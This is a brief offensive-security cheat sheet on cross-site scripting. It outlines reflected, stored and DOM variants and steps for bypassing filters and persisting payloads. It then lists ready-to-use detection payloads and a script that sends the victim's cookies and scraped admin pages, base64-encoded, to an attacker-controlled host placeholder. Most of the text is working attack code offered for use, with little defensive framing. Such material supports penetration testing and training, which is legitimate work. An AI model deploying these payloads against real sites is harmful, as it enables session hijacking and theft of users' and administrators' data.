# 03.01 Cross-Site Scripting XSS

> Pop JS via reflected (echoed payload), stored (persisted in DB), or DOM (`innerHTML`/`eval` sink) XSS variants.

## Overview

Three flavours. Reflected: payload echoes back in same request. Stored: payload persists in DB, fires on subsequent victim views. DOM: client-side JS writes user input into a sink (`innerHTML`, `eval`).

## Steps

- **Identify input + reflection sink** — search response for your test marker.
- **Bypass filters** — case, comments, HTML entities, alt event handlers (`onerror`).
- **Persist if possible** — stored XSS reaches admins.
- **Payload for impact** — cookie steal, fetch admin pages, key-log.

## Commands

### Detection payloads

```text
<script>alert(1)</script>
"><svg/onload=alert(1)>
<img src=x onerror=alert(1)>
javascript:alert(1)
<iframe srcdoc="<script>alert(1)</script>">
```

### Cookie exfil + admin scrape

```html
<script>
fetch('http://<LHOST>/?c='+document.cookie);
fetch('/admin/users',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('http://<LHOST>/?d='+btoa(t)));
</script>
```
